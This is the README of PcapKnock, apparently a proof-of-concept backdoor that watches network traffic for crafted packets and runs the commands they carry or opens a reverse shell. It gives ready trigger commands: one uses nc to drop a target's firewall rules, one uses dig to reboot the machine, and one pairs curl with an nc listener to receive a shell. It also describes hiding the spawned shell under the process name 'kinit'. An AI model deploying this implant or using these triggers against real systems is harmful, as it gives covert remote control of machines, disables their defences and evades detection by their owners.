PcapKnock
=========
PcapKnock listens for specially-crafted packets and either runs a command or
spawns a reverse shell based on the contents of the packets.  It is meant for
use as a PoC; there is no encryption or authentication.  It can either be built
as a standalone binary or an injectable library.

For legal use only.

Building
--------
The [`build.sh`](./build.sh) script will try to produce binaries and shared
object files, but often needs tweaking.

Usage
-----
Once pcapknock is running, all that's required to trigger it is a packet
containing either a command to run surrounded by `COMMAND...COMMAND` or an
address to which to call back with a shell surrounded with
`CALLBACK...CALLBACK`.

Trigger examples:
```bash
# Drop the Linux firewall
echo 'iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -F' | nc -u <TARGET> 53

# Reboot a box
dig @target COMMANDrebootCOMMAND

# Call back on port 80
(sleep 1 && curl -sv -d 'CALLBACK<LOCALIP>:80CALLBACK' http://target) & nc -nvl 80
```

For either a callback or a command, a shell is spawned, disassociated from the
parent process, and run with the name (i.e. `argv[0]`) `kinit`.  The name may
be changed in [`config.h`](./config.h).

Configuration
-------------
Two compile-time preprocessor macros may be set when building to control
debugging output and to cause the pcapknock to daemonze when run as a
standalone program.  These are `DEBUG` and `DAEMON`, respectively (i.e.
`-DDEBUG` and `-DDAEMON` when compiling).

Further compile-time configuration can be performed by editing
[`config.h`](./config.h), but in general, this shouldn't be necessary.

There is no runtime configuration.
